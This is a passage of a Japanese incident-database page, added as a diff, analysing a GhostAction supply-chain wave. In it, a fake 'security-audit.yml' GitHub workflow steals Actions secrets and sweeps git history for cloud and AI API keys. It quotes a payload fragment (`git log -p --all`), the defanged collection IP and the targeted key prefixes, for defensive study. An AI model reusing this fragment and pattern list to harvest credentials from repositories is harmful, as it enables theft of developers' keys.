@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<title>GhostAction 新波が履歴の鍵まで掃く — インシデント事例DB</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --border-2: #21262d;
+  --text: #e6edf3;
+  --dim: #8b949e;
+  --dim-2: #6e7681;
+  --faint: #484f58;
+  --accent: #58a6ff;
+  --ok: #3fb950;
+  --warn: #d29922;
+  --danger: #f85149;
+  --purple: #a371f7;
+  --purple-2: #d2a8ff;
+  --orange: #db6d28;
+  --code: #161b22;
+  --grp-a: #f85149;
+  --grp-b: #3fb950;
+  --grp-c: #d29922;
+  --grp-s: #8b949e;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);
+ font-family:-apple-system,'Hiragino Kaku Gothic Pro','Meiryo',sans-serif;
+ font-size:14px;line-height:1.75;overflow-wrap:anywhere}
+/* **長い機械文字列だけを折る。** CVSS ベクタ（69字）・SHA-256（64字）・
+   ウォレットアドレス（42字）は空白が無いので折り返せず、375px では
+   ページ全体が 474px まで横に伸びていた（2026-09-08 の実測）。
+   `word-break:break-all` は日本語の本文まで無条件に切ってしまうので使わない。
+   `overflow-wrap:anywhere` は**入りきらないときだけ**折り、加えて
+   min-content を縮めるのでグリッドの列が押し広げられなくなる
+   （break-word だと min-content が縮まず .figs の列がはみ出したまま）。
+   nowrap を指定したバッジ・表見出しには効かない（そちらが優先される）。 */
+/* **固定するのは h1 だけ。** ヘッダ全体を固定していたため、スクロール中も
+   サブタイトル（3行）とバッジが居座って画面を占有していた（2026-08-29 の指摘）。
+   h1 を header の外に出してあるのは、sticky が親の範囲内でしか効かないため。 */
+h1.stickytitle{position:sticky;top:0;z-index:100;margin:0;
+ background:var(--surface);border-bottom:1px solid var(--border);
+ padding:11px 20px;font-size:18px;font-weight:700;line-height:1.4;
+ display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;
+ overflow:hidden}
+h1.stickytitle .stid{font-family:monospace;font-size:11.5px;color:var(--dim);
+ font-weight:400;margin-right:9px}
+.site-header{background:var(--surface);border-bottom:1px solid var(--border);
+ padding:10px 20px 12px}
+.site-header .id{font-family:monospace;font-size:12px;color:var(--dim)}
+/* サブタイトル。元の長いタイトルを降ろす場所。**主張を弱めて場所を取らせない**
+   （スマホで h1 が6行・画面の22%を占めていた。2026-08-29） */
+.site-header .subtitle{font-size:12.5px;line-height:1.65;color:var(--dim);
+  margin:0 0 8px;font-weight:400}
+@media(max-width:600px){
+  h1.stickytitle{font-size:16px;padding:9px 12px;line-height:1.38}
+  .site-header{padding:8px 12px 10px}
+  /* 狭い画面ではサブタイトルを3行で切る。全文は本文冒頭の要約で読める */
+  .site-header .subtitle{font-size:12px;line-height:1.6;
+    display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;
+    overflow:hidden}
+}
+.wrap{max-width:1100px;margin:0 auto;padding:20px}
+/* **本文の行長は保つ。** 幅を広げても段落まで広げると読みにくくなる。
+   1440px で測ると本文はすでに1行60字あり、日本語の適正（40〜50字）を
+   超えていた（2026-08-31）。広げた分は表・図・年表に使わせる。 */
+.wrap p,.wrap li,.lead,.absent,.ctl{max-width:900px}
+.twrap,.figs,table.g,.tl,.part{max-width:none}
+.b{display:inline-block;font-size:11px;font-weight:600;padding:1px 7px;
+ border-radius:4px;margin:0 4px 3px 0;white-space:nowrap;vertical-align:middle}
+.b.type{background:#64b5f626;color:var(--accent);border:1px solid var(--accent)}
+.b.type2{color:var(--accent);border:1px solid #64b5f655}
+.b.st,.b.jr{color:var(--dim);border:1px solid var(--border)}
+.b.cause{color:var(--warn);border:1px solid #ffcc8055}
+.b.role{background:var(--surface2);color:var(--text)}
+.b.lc{color:var(--dim);border:1px solid var(--border)}
+.b.conf{background:#64b5f626;color:var(--accent)}
+.b.org{color:var(--dim);border:1px solid var(--border)}
+.b.sub{color:var(--warn);border:1px solid #ffcc8055}
+.b.rsn{color:var(--warn);border:1px solid #ffcc8055}
+.b.dk{color:var(--danger);border:1px solid #f48fb155}
+.b.kind{color:var(--dim);border:1px solid var(--border)}
+.b.slot{color:var(--dim);border:1px solid var(--border);font-weight:400}
+.b.tag{background:var(--surface2);color:var(--dim)}
+.b.rev,.b.ind,.b.refl{color:var(--ok);border:1px solid #80cbc455}
+.b.fu,.b.dead{color:var(--danger);border:1px solid #f48fb155}
+.lead{background:var(--surface);border-left:3px solid var(--accent);
+ padding:14px 16px;border-radius:0 6px 6px 0;margin:16px 0}
+.upd{background:var(--surface);border-left:3px solid var(--warn, #d29922);
+ padding:10px 16px;border-radius:0 6px 6px 0;margin:0 0 16px;font-size:13px}
+.upd-h{display:flex;gap:12px;align-items:baseline;flex-wrap:wrap;margin-bottom:4px}
+.upd-d{font-weight:600;color:var(--warn, #d29922)}
+.upd a{margin-left:auto}
+.meta{display:flex;gap:20px;flex-wrap:wrap;font-size:12px;color:var(--dim);margin:10px 0 4px}
+section{margin:26px 0}
+section h2{font-size:15.5px;color:var(--accent);border-bottom:1px solid var(--border);
+ padding-bottom:6px;margin-bottom:10px;line-height:1.55}
+section p{margin:9px 0}
+.srcs{font-size:11px;color:var(--dim);font-weight:400;margin-left:6px;white-space:nowrap}
+.blk{margin:26px 0}
+.blk h3{font-size:13px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em;
+ margin-bottom:10px;border-bottom:1px solid var(--border);padding-bottom:5px}
+/* 関係した組織（B79）——表ではなく1組織1ブロック。
+   画面が広いときだけ 名前｜説明 の2段組にする。説明は中央値72字の文章なので、
+   狭い画面では幅を全部使わせる */
+.orgs{margin:6px 0}
+.org{display:grid;grid-template-columns:minmax(150px,210px) 1fr;gap:3px 16px;
+ padding:10px 0;border-top:1px solid var(--border)}
+.org:first-child{border-top:none;padding-top:2px}
+.org-h{display:flex;flex-wrap:wrap;gap:5px;align-items:baseline}
+.org-n{font-weight:600;font-size:13px;line-height:1.5}
+.org-b{font-size:13px;line-height:1.75}
+.org-p{margin:0 0 4px}
+.org-p:last-child{margin-bottom:0}
+.org-l{display:inline-block;min-width:2.6em;margin-right:8px;font-size:11px;
+ color:var(--dim);font-weight:600}
+@media(max-width:600px){
+ .org{grid-template-columns:1fr;gap:5px}
+ .org-b{font-size:12.5px}
+}
+table.g{border-collapse:collapse;width:100%;font-size:13px;margin:6px 0}
+/* 表は自分の中で横に流す。ページ全体が横スクロールすると本文が読めなくなる
+   （スマホで 811px の表がはみ出していた。2026-08-29） */
+.twrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:6px 0}
+.twrap table.g{margin:0}
+table.g th{background:var(--surface2);padding:7px 9px;text-align:left;
+ border:1px solid var(--border);font-weight:600;white-space:nowrap}
+table.g td{padding:7px 9px;border:1px solid var(--border);vertical-align:top}
+table.g tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+table.dt th{width:150px;color:var(--dim)}
+.on{font-weight:600}
+.sm{font-size:12px;color:var(--dim);line-height:1.6}
+.nowrap{white-space:nowrap} .tw{width:132px}
+.figs{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(270px,100%),1fr));gap:10px}
+.fig{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:11px 13px}
+.fh{display:flex;flex-wrap:wrap;align-items:baseline;gap:4px;margin-bottom:5px}
+.fl{font-size:12px;color:var(--dim);flex:1;min-width:100%;line-height:1.5}
+.fv{font-size:23px;font-weight:700;line-height:1.25}
+.fu{font-size:12px;font-weight:400;color:var(--dim);margin-left:4px}
+.fa{font-size:11px;color:var(--dim);margin-top:2px}
+.fn{font-size:11.5px;color:var(--dim);margin-top:7px;padding-top:7px;
+ border-top:1px solid var(--border);line-height:1.65}
+.corr{font-size:11.5px;margin-top:6px;padding:5px 8px;background:var(--surface2);
+ border-radius:4px;color:var(--warn)}
+.box{border-radius:8px;padding:14px 16px;margin:26px 0}
+.box .bt{font-size:13px;font-weight:700;margin-bottom:9px}
+.box .bc{display:inline-block;font-size:11px;padding:0 7px;border-radius:9px;
+ margin-left:7px;background:rgba(255,255,255,.09)}
+.box ul{list-style:none}
+.box li{padding:7px 0;border-top:1px solid rgba(255,255,255,.07)}
+.box li:first-child{border-top:none}
+.unk{background:#ffcc8014;border:1px solid #ffcc8044}
+.unk .bt{color:var(--warn)}
+.disc{background:#f48fb114;border:1px solid #f48fb144}
+.disc .bt{color:var(--danger)}
+.rep-box{background:#80cbc414;border:1px solid #80cbc444}
+.rep-box .bt{color:var(--ok)}
+.rep{padding:8px 0;border-top:1px solid rgba(255,255,255,.07)}
+.rep:first-of-type{border-top:none}
+.ui{font-weight:600;margin-right:6px}
+.cl{margin-left:18px} .cl li{margin:2px 0}
+.sub{font-size:12.5px;padding:3px 0;color:var(--text)}
+.rg{margin-bottom:16px}
+.rgt{font-size:12px;font-weight:700;color:var(--accent);margin-bottom:5px}
+.rg ol{list-style:none}
+.rg li{font-size:12.5px;padding:4px 0;line-height:1.7}
+.rid{font-family:monospace;color:var(--dim);margin-right:3px}
+a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+code{background:var(--code);border-radius:3px;padding:1px 5px;font-size:12px;color:#a5b4fc}
+ul,ol{margin:8px 0 8px 20px} li{margin:3px 0}
+strong{color:#f1f5f9}
+/* 目次 — 広い画面では左に追従、狭い画面では折りたたみ */
+html{scroll-behavior:smooth}
+.blk,section,.part,.box,.less{scroll-margin-top:92px}
+.toc{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+ padding:12px 14px;margin:18px 0}
+.toc>summary{cursor:pointer;font-size:13px;font-weight:700;color:var(--accent);
+ list-style:none}
+.toc>summary::-webkit-details-marker{display:none}
+.toc>summary::before{content:"▾ ";font-size:11px}
+.toc:not([open])>summary::before{content:"▸ "}
+.tocl{list-style:none;margin:10px 0 0;padding:0;
+ columns:2;column-gap:22px}
+.tocl li{margin:0;break-inside:avoid}
+.tocl li.tg{font-size:11px;font-weight:700;letter-spacing:.04em;margin:9px 0 3px;
+ padding-top:7px;border-top:1px solid var(--border)}
+.tocl li.tg:first-child{margin-top:0;padding-top:0;border-top:none}
+.tocl li.tg1{color:var(--accent)}
+.tocl li.tg2{color:var(--ok)}
+.tocl li.tg3{color:var(--dim)}
+.tocl a{display:block;font-size:12.5px;padding:2.5px 0;line-height:1.55;
+ color:var(--text);text-decoration:none}
+.tocl a:hover{color:var(--accent);text-decoration:underline}
+@media(min-width:1180px){
+ /* PC で左右に大きな余白ができて「狭い」と見えていたので広げた
+    （1440px の画面で コンテナ1180px・本文870px＝画面の60%だった）。
+    minmax(0,1fr) にしないと、広い表が入ったときにカラムがはみ出す */
+ .wrap{max-width:1400px;display:grid;grid-template-columns:260px minmax(0,1fr);
+   gap:38px;align-items:start}
+ .wrap>.meta,.wrap>.lead,.wrap>footer{grid-column:2}
+ .toc{grid-column:1;grid-row:1 / span 99;position:sticky;top:92px;
+   max-height:calc(100vh - 110px);overflow:auto;margin:0}
+ .tocl{columns:1}
+ .toc>summary{pointer-events:none}
+ .toc>summary::before{content:""}
+}
+@media(max-width:1179px){
+ .tocl{max-height:none}
+}
+@media(min-width:1180px){
+ /* 本文カラムが広くなった分、段落だけ行長を保つ（表と図は全幅を使う） */
+ .wrap>*:not(.toc) p,.wrap>*:not(.toc) li{max-width:960px}
+}
+@media(max-width:600px){
+ .tocl{columns:1}
+}
+/* 2部構成の仕切り */
+.part{margin:34px 0 20px;padding:14px 16px;border-radius:8px}
+.part .ph{font-size:17px;font-weight:700;display:flex;align-items:center;gap:10px}
+.part .pn{font-size:11px;font-weight:700;padding:2px 9px;border-radius:4px;letter-spacing:.04em}
+.part .pd{font-size:12px;color:var(--dim);margin-top:6px;line-height:1.75}
+.p1{background:#64b5f612;border:1px solid #64b5f644;border-left:4px solid var(--accent)}
+.p1 .ph{color:var(--accent)} .p1 .pn{background:var(--accent);color:#0f1117}
+.p2{background:#80cbc412;border:1px solid #80cbc444;border-left:4px solid var(--ok)}
+.p2 .ph{color:var(--ok)} .p2 .pn{background:var(--ok);color:#0f1117}
+.blknote{font-size:11.5px;color:var(--dim);margin:-4px 0 10px;line-height:1.7}
+/* 攻撃の経過 */
+.chain{list-style:none;margin:10px 0 0}
+.chain li{position:relative;padding:10px 0 10px 16px;border-left:2px solid var(--border);
+ margin-left:4px}
+.chain li::before{content:"";position:absolute;left:-6px;top:16px;width:9px;height:9px;
+ border-radius:50%;background:var(--accent)}
+.stg{margin-bottom:5px}
+.b.stage{background:#64b5f626;color:var(--accent)}
+.b.do,.b.eff,.b.assess,.b.axis{color:var(--dim);border:1px solid var(--border)}
+/* 対応の指標 */
+.mets{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(160px,100%),1fr));gap:9px}
+.met{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:10px 12px}
+.ml{font-size:11.5px;color:var(--dim);line-height:1.5}
+.mv{font-size:22px;font-weight:700;margin-top:3px}
+.dec{list-style:none;margin:6px 0 0}
+.dec li{padding:9px 0;border-top:1px solid var(--border)}
+.dec li:first-child{border-top:none}
+/* 構造図 */
+.dia{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
+.diat{font-size:13px;font-weight:700;margin-bottom:8px}
+.svgwrap{overflow-x:auto}
+.svgwrap svg{min-width:620px}
+/* 学び */
+.less{background:#80cbc40e;border:1px solid #80cbc433;border-radius:8px;
+ padding:14px 16px;margin:18px 0}
+.lesst{font-size:13px;font-weight:700;color:var(--ok);margin-bottom:8px}
+.less ul{list-style:none;margin:0}
+.less li{padding:11px 0;border-top:1px solid rgba(255,255,255,.07)}
+.less li:first-child{border-top:none}
+.lp{font-weight:700;line-height:1.65}
+.lw{font-size:12.5px;color:var(--dim);margin-top:4px;line-height:1.7}
+.la{font-size:12.5px;margin-top:6px;padding:7px 10px;background:var(--surface2);
+ border-radius:5px;line-height:1.7}
+.la b{color:var(--ok);margin-right:6px}
+/* 内容が無いことを明示する箱（黙って省略しない） */
+.absent{font-size:12.5px;color:var(--dim);background:var(--surface);
+ border:1px dashed var(--border);border-radius:6px;padding:11px 13px;line-height:1.75}
+.less.empty{background:transparent;border-style:dashed}
+.less.empty .lesst{color:var(--dim)}
+.chk{color:var(--ok);font-weight:700;margin-right:5px}
+.cl.ok li{color:var(--text)} .cl.warn li{color:var(--warn)}
+.ctl{padding:2px 0;font-size:12.5px}
+footer{border-top:1px solid var(--border);margin-top:40px;padding:18px 0;
+ font-size:11.5px;color:var(--dim);line-height:1.9}
+@media(max-width:600px){
+ .wrap{padding:14px 12px} .figs{grid-template-columns:1fr}
+ table.g{font-size:12px} table.dt th{width:auto}
+ .twrap{width:auto}
+ .twrap table.g{min-width:520px}
+}
+</style>
+</head>
+<body>
+<h1 class="stickytitle"><span class="stid">INC-2026-0455</span>GhostAction 新波が履歴の鍵まで掃く</h1>
+<header class="site-header">
+  <p class="subtitle">GhostAction キャンペーンの新たな波で、侵害されたメンテナのアカウントから security-audit.yml という名の偽ワークフローが346リポジトリへ一括コミットされ、 従来の GitHub Actions シークレット窃取に加えて作業ツリーと git 全履歴から AWS・Anthropic・OpenAI 等13種のクラウド／AI 資格情報を掃き出す機能が追加—— 公開後に500超のアカウント・数万リポジトリへ拡大</p>
+  <div><span class="b type">脅威・攻撃キャンペーン</span><span class="b type2">委託先・再委託先起因で委託元多数に波及</span><span class="b st">続報が続いている</span><span class="b jr">有名事象として記録（日本と直接の関係は薄い）</span><span class="b cause">認証情報の悪用（使い回し・推測可能・窃取）</span><span class="b cause">設計・実装上の不備</span><span class="b cause">ガバナンス・組織文化（ガイドライン理解不足・丸投げ等）</span></div>
+</header>
+<div class="wrap">
+
+<div class="meta">
+  <span>初報: 2026年10月9日（Socket のブログ公表。同日に追記あり）</span>
+  <span>最終更新: 2026年10月10日</span>
+</div>
+
+<div class="lead"><p><strong>Socket は2026年10月9日、サプライチェーン攻撃キャンペーン「GhostAction」の新たな波を公表した。</strong> 2026年10月8日、侵害された2つの GitHub メンテナアカウント（henrywoo・kitao）から、<code>.github/workflows/security-audit.yml</code> という単一ファイルのコミットが<strong>346リポジトリ</strong>へ送り込まれた。対象には <strong>Uber 所有の uber/athenadriver</strong> と、<strong>スター18,420の kitao/pyxel</strong> が含まれる。</p>
+<p><strong>このワークフローにセキュリティ上の機能は無い。</strong> 資格情報を集めて単一の固定 IP アドレス（<code>193.32.204[.]199</code>）へ平文で POST する。</p>
+<p><strong>従来の波との違いは、狙う鍵の範囲である。</strong> 2025年9月に GitGuardian が記録した GhostAction は GitHub Actions のシークレットだけを取った。<strong>本変種はその機能を保ったまま、<code>fetch-depth: 0</code> で全ブランチ・全タグを取得し、作業ツリーと <code>git log -p --all</code> の全履歴に対して13種の資格情報パターンを走らせる機能を追加した</strong>——AWS のアクセスキー ID／シークレットアクセスキー／STS セッショントークン、Anthropic（<code>sk-ant-</code>）・OpenAI（<code>sk-proj-</code>）・OpenRouter の API キー、GitHub／GitLab の個人アクセストークン、Google/Firebase/GCP の API キー、Slack トークン、SendGrid の API キー。</p>
+<p><strong>最も作り込まれているのは AWS 向けの2つの前後文抽出である。</strong> <code>AKIA</code>／<code>ASIA</code> で始まるアクセスキー ID の<strong>前後2行</strong>を作業ツリーと履歴の両方から切り出す。<strong>キー ID 単体では認証できないため、1〜2行離れた場所にある40文字のシークレットアクセスキーごと鍵対として回収する設計である。</strong></p>
+<p><strong>影響はその後拡大した。</strong> Socket は公開後の追記で、<strong>2026年10月7日以降に500超の GitHub アカウントが同じ悪性ワークフローを数万リポジトリへコミットしていると述べている</strong>（侵害された貢献者経由で組織所有のリポジトリにも到達）。</p>
+<p><strong>本記録が構造上の中心として評価したのは2点である。</strong> ①<strong>「履歴に一度でも入れた鍵」が攻撃対象として明確に組み込まれた</strong>（本記録の判断）—— <strong>既定ブランチから消したつもりの鍵が、到達可能なブランチやタグから回収される。Actions シークレットの入れ替えでは、この露出は何も解消しない。</strong> ②<strong>偵察を要する半分と、要しない半分が1つのファイルに同居している</strong>（本記録の指摘）—— <strong>履歴掃きは偵察を要さないため、同一の静的ファイルを346リポジトリへ短時間で展開できた。</strong></p></div>
+
+
+<details class="toc" id="toc" open><summary>目次</summary><ol class="tocl"><li class="tg tg1">起きたこと</li><li><a href="#s1" title="公表されていない・確定していないこと">公表されていない・確定していないこと</a></li><li><a href="#s2" title="関係した組織">関係した組織</a></li><li><a href="#s3" title="主な数値">主な数値</a></li><li><a href="#s4" title="攻撃の経過">攻撃の経過</a></li><li><a href="#s5" title="公表・報道からわかったこと（7件）">公表・報道からわかったこと（7件）</a></li><li><a href="#s12" title="事案の詳細">事案の詳細</a></li><li><a href="#s13" title="経過">経過</a></li><li><a href="#s14" title="資料間の食い違い・留保">資料間の食い違い・留保</a></li><li class="tg tg2">ここから学べること</li><li><a href="#s15" title="波及の構造">波及の構造</a></li><li><a href="#s16" title="どこで止められたか">どこで止められたか</a></li><li><a href="#s17" title="対応の評価">対応の評価</a></li><li><a href="#s18" title="CISO・経営層への示唆">CISO・経営層への示唆</a></li><li><a href="#s19" title="セキュリティ技術者への示唆">セキュリティ技術者への示唆</a></li><li><a href="#s20" title="自組織に当てはまるか">自組織に当てはまるか</a></li><li class="tg tg3">資料</li><li><a href="#s21" title="出典">出典</a></li><li><a href="#s22" title="この記録の更新履歴">この記録の更新履歴</a></li><li><a href="#s23" title="タグ">タグ</a></li></ol></details>
+
+<div class="part p1" id="part1"><div class="ph"><span class="pn">Part 1</span>起きたこと</div><div class="pd">公表資料と報道から確認できた事実を記録します。確定した事実・報道にとどまる情報・公表されていない事項を区別して示します。評価や推奨はここには書きません。</div></div>
+<div id="s1"><div class="box unk"><div class=bt>公表されていない・確定していないこと<span class=bc>8</span></div><ul><li><span class=ui>メンテナアカウントの資格情報がどのように入手されたか</span><span class="b rsn">公表されていない</span></li><li><span class=ui>キャンペーン全体で実際に窃取された資格情報の件数・種別の内訳</span><span class="b rsn">公表されていない</span></li><li><span class=ui>収集された資格情報が実際に使用されたか（クラウド側・配布基盤側での不正利用）</span><span class="b rsn">公表されていない</span></li><li><span class=ui>日本の組織・開発者のリポジトリが含まれるか</span><span class="b rsn">公表されていない</span></li><li><span class=ui>攻撃者の帰属（個人か組織か、動機が金銭か他か）</span><span class="b rsn">公表されていない</span></li><li><span class=ui>追記（2026年10月9日）の正確な時刻</span><span class="b rsn">公表されていない</span></li><li><span class=ui>GitHub・Uber・影響を受けたメンテナによる公表の有無</span><span class="b rsn">探索したが未発見</span></li><li><span class=ui>履歴が20万行を超えるリポジトリで古い側が取りこぼされるかどうか</span><span class="b rsn">検証できない</span></li></ul></div></div>
+<div class="blk " id="s2"><h3>関係した組織</h3><div class=orgs><div class=org><div class=org-h><span class=org-n>Socket（Socket, Inc.）</span><span class="b role">発見・通報した主体</span><span class="b lc">確認済</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>GitGuardian</span><span class="b role">発見・通報した主体</span><span class="b lc">間接言及</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>GitHub（GitHub, Inc.）</span><span class="b role">サービス・基盤の提供者（SaaS・決済網等）</span><span class="b lc">推定</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>Uber Technologies, Inc.（uber/athenadriver）</span><span class="b role">波及先（取引先・利用事業者）</span><span class="b lc">推定</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>（GitHub アカウント henrywoo。侵害されたメンテナアカウント）</span><span class="b role">悪用された資産の保有者</span><span class="b lc">確認済</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>（GitHub アカウント kitao。侵害されたメンテナアカウント。kitao/pyxel の保有者）</span><span class="b role">悪用された資産の保有者</span><span class="b lc">確認済</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>（PyPI・crates.io。パッケージの配布基盤）</span><span class="b role">サービス・基盤の提供者（SaaS・決済網等）</span><span class="b lc">被害なし確認</span></div><div class=org-b></div></div></div></div>
+<div class="blk " id="s3"><h3>主な数値</h3><div class="blknote">各数値には確度（確定／約／最大）と出所（公表値／報道値／本記録の算出）を付しています。</div><div class=figs><div class=fig><div class=fh><span class=fl>2026年10月8日のバーストで悪性ワークフローが置かれたリポジトリ数</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>346<span class=fu>リポジトリ</span></div><div class=fn>**Socket が観測した件数**（本記録の確認）—— **henrywoo 名前空間318件（ソース39件・フォーク279件）、kitao 名前空間27件、 uber/athenadriver 1件。** **これは2026年10月8日のバーストに限った数であり、 キャンペーン全体の規模ではない**（本記録の明記）—— **追記では500超のアカウント・数万リポジトリとされている。** **値の出所は第三者（ベンダー）の調査であり、 GitHub や被害組織の公表ではない**（本記録の判断）</div></div><div class=fig><div class=fh><span class=fl>henrywoo 名前空間のリポジトリ数</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>318<span class=fu>リポジトリ</span></div><div class=fn>**ソースリポジトリ39件とフォーク279件の合計**（Socket の観測）。 **本記録はフォークが8割を占める点を記録する**（本記録の指摘）—— **フォークは所有者の管理意識が低くなりやすく、 Actions を有効にしたまま放置されやすい**（本記録の評価）。 **Socket はフォークの管理者に対し、影響を受けた名前空間から取得した フォークで Actions を有効にする前に該当ワークフローの有無を 確認するよう求めている**</div></div><div class=fig><div class=fh><span class=fl>kitao 名前空間のリポジトリ数</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>27<span class=fu>リポジトリ</span></div><div class=fn>**2026年10月8日13時40分〜13時44分（UTC）の4分間に処理された** （Socket の観測）。 **kitao/pyxel を含む**</div></div><div class=fig><div class=fh><span class=fl>追記時点で悪性ワークフローをコミットしたことが確認された GitHub アカウント数</span><span class="b conf">最少</span><span class="b org">第三者調査</span></div><div class=fv>500<span class=fu>アカウント</span></div><div class=fn>**原文は「more than 500 GitHub accounts」であり、500超である** （原文英語。本記録の訳）—— **本記録が確度を「少なくとも」としたのはこのためである**（本記録の判断）。 **2026年10月7日以降の集計であり、本文で分析された10月8日のバーストを含む** （本記録の読み）。 **1アカウント＝1人のメンテナとは限らない**（本記録の留保）—— **Socket は組織所有のリポジトリにも侵害された貢献者経由で 到達したとしている**</div></div><div class=fig><div class=fh><span class=fl>作業ツリーと git 履歴に対して照合される資格情報パターンの種類数</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>13<span class=fu>種類</span></div><div class=fn>**Socket がペイロードから抽出して列挙した数**（本記録の確認）—— **AWS 系4種（AKIA／ASIA のアクセスキー ID、変数名で照合する シークレットアクセスキー、STS セッショントークン）、 AI サービス3種（Anthropic・OpenAI・OpenRouter）、 ソース管理3種（GitHub の classic／fine-grained PAT、GitLab の PAT）、 SaaS・クラウド API 3種（Google/Firebase/GCP、Slack、SendGrid）。** **本記録はこの内訳を、攻撃者が何に値段を付けているかの指標として記録する** （本記録の評価）</div></div><div class=fig><div class=fh><span class=fl>kitao/pyxel のスター数</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>18,420<span class=fu>スター</span></div><div class=fn>**Socket が記した規模感の背景値**（本記録の確認。フォークは966件）。 **本事案の被害数ではない**（本記録の明記）—— **本記録がこの値を残したのは、公開用資格情報が狙われた対象の 下流の広さを示すためである**（本記録の判断）—— **Rust と Python により PyPI と crates.io で配布されている**</div></div><div class=fig><div class=fh><span class=fl>ペイロードが git 履歴から読み込む行数の上限</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>200,000<span class=fu>行</span></div><div class=fn>**ペイロードは `git log -p --all 2&gt;/dev/null | head -200000` として 全ブランチ・全タグのパッチ本文を20万行まで読み込む**（Socket が示した全文より。 本記録の確認）。 **以降の照合はこのバッファに対して行われる**（本記録の読み）—— **履歴が20万行を超える巨大なリポジトリでは、 古い側が取りこぼされる可能性がある**（本記録の推定。 Socket はこの点に言及していない）。 **あわせてフラットな一致一覧は `head -300`、 前後文は `head -150` で切られている**</div></div></div></div>
+<div class="blk " id="s4"><h3>攻撃の経過</h3><div class="blknote">公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。</div><p>**Socket は本キャンペーンを3段に分けている**—— **「The campaign has three stages, only one of which lives in the workflow file」（キャンペーンには3つの段階があり、 そのうち1つだけがワークフローファイルの中にある）** （原文英語。本記録の訳）。 ①**攻撃者がメンテナアカウントの有効な資格情報を入手する （入手方法は Socket も観測していない）。** ②**各リポジトリが実際に使っている Actions シークレットの名前を偵察し、 その名前をペイロードに埋め込んでからコミットする。** ③**ワークフローを既定ブランチへ直接コミットし、次の push で実行される。** **ワークフローの中身は2つの半分でできている**（Socket の分類）—— **継承された半分（Actions シークレットの窃取。初期の GhostAction と同じ）と、 追加された半分（作業ツリーと git 全履歴に対する13種の資格情報の掃き出し）。** **両者は単一の変数に連結され、1回の HTTP POST で送出される**—— **「a defender reading network data sees one POST carrying two unrelated classes of secret」（ネットワークデータを見る防御側には、 無関係な2種類のシークレットを運ぶ1つの POST が見える）** （原文英語。本記録の訳）。 **本記録の読みは次のとおりである**—— **本変種の要点は、偵察を要する半分と要しない半分が1ファイルに同居したことである** （本記録の判断）—— **履歴掃きは偵察を要さないため、同一の静的ファイルを 346リポジトリへ短時間で展開できた。** **そして Socket が指摘するとおり、2つの露出は対策も互いに効かない**—— **「Rotating Actions secrets does nothing for a committed-credential exposure, and scanning the working tree does nothing for an Actions-secret exposure」（Actions シークレットの入れ替えは コミットされた資格情報の露出に何の効果もなく、 作業ツリーの走査は Actions シークレットの露出に何の効果もない）** （原文英語。本記録の訳）</p><ol class=chain><li><div class=stg><span class="b stage">1. 認証情報アクセス</span><span class="b conf">推定</span><span class=srcs>[1]</span></div><div>**攻撃者がメンテナアカウントの有効な資格情報を入手する**（Socket の第1段）。 **「First, the operator obtains a working credential for a maintainer account. Socket did not observe how.」 （第一に、攻撃者はメンテナアカウントの有効な資格情報を入手する。 Socket はその方法を観測していない）**（原文英語。本記録の訳）。 **フィッシング・インフォスティーラ・漏えいしたトークンの再利用の いずれも候補となるが、本件では判別されていない**（本記録の明記）。 **追記で500超のアカウントに拡大している点は、 個別の標的選定ではなく大量の資格情報を手にしていることを示す** （本記録の推定）</div><div class=fn>根拠: Socket ブログ「Injection of the Malicious Workflow」</div></li><li><div class=stg><span class="b stage">2. 偵察</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**各リポジトリが実際に使っている Actions シークレットの名前を偵察し、 その名前をペイロードに埋め込んでからコミットする**（Socket の第2段）。 **「each repository is scanned for the Actions secrets it already uses, and those exact names are written into the payload before it is committed」（各リポジトリは既に使っている Actions シークレットについて 走査され、それらの正確な名前がコミット前にペイロードに書き込まれる）** （原文英語。本記録の訳）。 **Socket はこれを GitGuardian が初期の波で記述した段と同定している。** **自動化の根拠として「346 repositories were processed across two accounts in two short windows, each file byte-identical apart from the rendered secret list」（2つのアカウントにまたがる346リポジトリが 2つの短い窓で処理され、各ファイルは展開されたシークレット一覧を除いて バイト単位で同一だった）を挙げている**（原文英語。本記録の訳）</div><div class=fn>根拠: Socket ブログ「Injection of the Malicious Workflow」「The Inherited Half」</div></li><li><div class=stg><span class="b stage">3. 実行</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**ワークフローを既定ブランチへ直接コミットし、次の push で実行される** （Socket の第3段）。 **ファイル名は `.github/workflows/security-audit.yml` （別名 `.github/workflows/github_actions_security.yml`）、 コミットメッセージは `Add security audit workflow`／ `Update security audit workflow`／ `Add Github Actions Security workflow`。** **トリガは `workflow_dispatch` と 